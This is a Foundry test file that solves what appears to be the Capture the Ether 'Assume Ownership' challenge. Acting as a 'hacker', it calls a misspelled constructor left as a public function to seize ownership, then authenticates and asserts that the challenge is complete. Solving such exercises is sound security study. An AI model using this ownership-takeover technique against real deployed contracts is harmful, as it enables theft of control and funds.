// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import {AssumeOwnershipChallenge} from "src/Miscellaneous/AssumeOwnership.sol";

contract AssumeOwnershipChallengeTest is Test {
    AssumeOwnershipChallenge public assumeOwnershipChallenge;
    address hacker = makeAddr("hacker");

    function setUp() public {
        assumeOwnershipChallenge = new AssumeOwnershipChallenge();
    }

    function testAssumeOwnership() public {
        console.log(
            "before hack, isComplete:",
            assumeOwnershipChallenge.isComplete()
        );

        vm.startPrank(hacker);
        assumeOwnershipChallenge.AssumeOwmershipChallenge();
        assumeOwnershipChallenge.authenticate();
        vm.stopPrank();

        console.log(
            "after hack, isComplete:",
            assumeOwnershipChallenge.isComplete()
        );

        assertTrue(assumeOwnershipChallenge.isComplete());
    }
}